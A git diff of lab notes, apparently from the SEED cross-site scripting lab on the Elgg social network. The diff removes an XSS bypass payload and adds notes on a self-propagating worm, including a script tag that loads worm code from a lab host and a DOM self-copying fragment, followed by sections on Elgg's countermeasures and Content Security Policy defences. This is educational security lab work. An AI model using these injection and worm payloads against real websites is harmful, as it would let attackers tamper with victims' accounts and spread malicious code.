@@ -96,12 +96,8 @@
 
 - what if the web application only provide the Editor mode for the `About Me` field, i.e., we cannot switch to the Text mode, can we still launch a sucessful attack?
     - if we directly put the code in `About Me` field, it will not work
-    - after entering some content, e.g., `xyz`, click `Edit HTML`, we can see that the actual content is `<p>xyz</p>`, our input will be treated as text, but we can bypass this by using `</p><script>alert('XSS');</script><p>`, then the HTML of the page will be
-        ```
-        <p></p>
-        <script>alert('XSS');</script> <---- JS code
-        </p><p>
-        ```
+    - after entering some content, e.g., `<script>`, click save, and we can see the data in the request body using HTTP Header Live, it's `%ltscript%gt`, this means that some HTML special characters are encoded, e.g., `<` -> `%lt`, `>` -> `%gt`
+    - this is an effective countermeasure for XSS attack
 ## Task 5: Modifying the Victim's Profile
 - objective: modify the victim's profile when the victime visits Samy's page (Specifically, the `About Me` field)
 - login as Samy, edit the profile, input `7777` in `About Me` field, then save, by using HTTP Header Live, we can find the request, it is a POST request
@@ -140,4 +136,75 @@
         ```
     - login as Alice, visit Samy's profile, then we can find that Alice's About Me is `MODIFIED!`
 
-## Task 6: 
+## Task 6: Writing a Self-Propagating XSS Worm
+- a real worm should be able to propagate itself, namely, whenever some people view an infected profile, not only will their profiles be modified, the worm will also be propagated to their profiles, further affecting others who view these newly infected profiles
+- this is exactly the same mechanism used by the Samy Sworm, the JS code that can achieve this is called a *self-propagating cross-site scripting worm*
+- when the malicious JS code modifies the victim's profile, it should copy itself to the victim's profile, there are several approaches, 2 common approaches are:
+    1. **Link Approach**: if the worm is included using the `src` attribute in the `<script>` tag, writing self-propagating worms is much easier
+        - payload `<script type="text/javascript" src="http://10.9.0.1:9875/worm_link.js"></script>`
+        - inside `worm_link.js`, it will modify the `About Me` of the victim to a text `<p>INFECTED!</p>` and the payload
+    2. **DOM Approach**: if the entire JS code is embedded in the infected profile, to propagate, the worm code can use DOM APIs to retrieve a copy of itself from the webpage
+        ```
+        var headerTag="<script id=\"worm\" type=\"text/javascript\">";
+        var jsCode=document.getElementById("worm").innerHTML;
+        var tailTag="</" + "script>";
+        var wormCode=encodeURIComponent(headerTag+jsCode+tailTag);
+        ```
+
+### Elgg's Countermeasures
+- one is a custom built security plugin `HTMLawed`, it validates the user input and removes the tags from the input
+- PHP's built-in method `htmlspecialchars()`, it encode the special characters in user input, e.g., `<` to `&lt`, `>` to `&gt`, etc
+
+## Task 7: Defeating XSS Attacks Using CSP
+- the fundamental problem of the XSS vulnerability is that HTML allows JavaScript code to be mixed with data. Therefore, to fix this problem, we need to separate code from data
+- there are 2 ways to include JS code inside an HTML page, one is the inline approach (directly places code inside the page), and the other is the link approach (puts the code in an external file, and then link to it from inside the page)
+- the inline approach is the culprit of the problem, in link approach, websites can tell browsers which sources are trustworthy, and attacker cannot place code in thos trustworthy places
+- Content Security Policy (CSP) is a mechanism designed to defeat XSS and ClickJacking attacks. It not only restricts JS code, it also restricts other page contents, such as limiting where pictures, audio, and video can come from, as well as whether a page can be put inside an iframe or not
+
+### Experiment website setup
+- in `Labsetup/image_www` there is a file `apache_csp.conf`, it defines five websites, which share the same folder, but they uses different files in this folder
+    - `example60`, `example70`, used for hosting JS code
+    - `example32a`, `example32b`, `example32c`, three websites with different CSP configurations
+- after changing configuration inside container (`/etc/apache2/sites-available`), run `service apache2 restart`
+
+### Setting CSP Policies
+- there are 2 typical ways to set the header
+    1. by the web server (such as Apache)
+        - Apache can set HTTP headers for all the responses
+            ```
+            Header set Content-Security-Policy " \
+                    default-src 'self'; \
+                    script-src 'self' *.example70.com \
+            "
+            ```
+    2. by the web application
+        - the entry of the third `VritualHost` is `phpindex.php`, we can make the program to add CSP header to the response 
+            ```
+            <?php
+                $cspheader = "Content-Security-Policy:".
+                             "default-src 'self'".
+                             "script-src 'self' 'nonce-111-111-111' *example70.com".
+                             "";
+            ?>
+            ```
+### Tasks
+- visit `http://www.example32a.com`, `http://www.example32b.com`, `http://www.example32c.com`, click the button `Click me` to try execute the JS code, only in `a` the JS will be executed, because when clicking the button, it tries to execute an inline script, in `b`, all inline scripts are disallowed, in `c`, inline scripts can be executed only when their `nonce` is `111-111-111`
+- in `b`, all inline scripts cannot be executed, in `c`, inline scripts with `nonce-111-111-111` (i.e., `<script nonce="111-111-111"></script>`) can be executed
+- change the Apache configuration on `b`, so Area 5 and 6 display OK
+    ```
+    Header set Content-Security-Policy " \
+                    default-src 'self'; \
+                    script-src *.example70.com *.example60.com \
+            "
+    ```
+- change the PHP configuration on `c`, so that Area 1, 2, 4, 5, and 6 all display OK
+    ```
+    <?php
+        $cspheader = "Content-Security-Policy:".
+                     "default-src 'self'".
+                     "script-src 'self' 'unsafe-inline' *example70.com *example60.com".
+                     "";
+    ?>
+    ```
+
+- why CSP helps prevent XSS: becasue the website can control what scripts can be executed on the server, e.g., it can allow only scripts from the sever itself to be executed, and disable all inline scripts, in this case, if attacker embeds the JS code in its profile, it will be inline code, if the attacker injected a link script, it is from the attacker's server, not the victim server, in both cases, the malicious code won't get executed
